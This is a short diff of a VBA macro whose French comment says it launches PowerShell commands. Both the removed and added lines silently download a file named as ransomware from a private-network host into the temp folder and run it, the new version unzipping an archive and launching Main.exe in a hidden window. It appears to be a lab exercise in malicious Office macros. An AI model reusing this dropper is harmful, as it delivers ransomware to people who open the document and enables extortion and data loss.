@@ -2,7 +2,7 @@ Sub macro_powershell()
 
     'Crée un Shell appelant des commandes powershell
     Dim powershellCommands
-    powershellCommands = Shell("powershell ""wget 'http://192.168.85.128/ransonware.exe' -outfile $Env:temp\ransonware.exe ; .$Env:temp\ransonware.exe """, 0)
+    powershellCommands = Shell("powershell Invoke-WebRequest -Uri http://192.168.85.128/ransonware.zip -OutFile $Env:temp\ransonware.zip ; Expand-Archive $Env:temp\ransonware.zip -dest $Env:temp\ -force ; cd $Env:temp\ransonware\ ; .\Main.exe ; exit", 0)
 
 End Sub
 
